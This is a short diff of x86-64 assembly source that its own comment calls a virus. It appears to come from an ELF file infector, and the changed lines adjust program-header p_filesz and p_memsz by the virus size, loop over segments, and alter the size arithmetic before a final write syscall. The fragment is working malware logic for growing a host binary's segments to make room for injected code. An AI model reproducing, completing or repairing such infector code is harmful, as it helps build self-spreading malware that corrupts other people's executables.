@@ -114,13 +114,13 @@ _else_if:
 	mov r10, QWORD [rsp + 32]
 	add r10, 32 ; p_filesz offset
 	mov r11, QWORD [rsp + 16]
-	add r11, 32 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
+	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
 	add QWORD [r10], r11
 	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
 	add QWORD [r10], r11
 
 _inc_jmp_loop:
-	add QWORD [rsp + 32], 56
+	add QWORD [rsp + 32], 56 
 	inc QWORD [rsp + 48]
 	jmp _treat_all_segments
 
@@ -220,8 +220,8 @@ _last_write:
 	mov rsi, QWORD [rsp] ; buff
 	add rsi, QWORD [rsp + 72]
 	mov rdx, QWORD [rsp + 8] ; size
-	sub rdx, QWORD [rsp + 16]
-	sub rdx, 8
+;	sub rdx, QWORD [rsp + 16]
+;	sub rdx, 8
 	sub rdx, QWORD [rsp + 72]
 	syscall
 
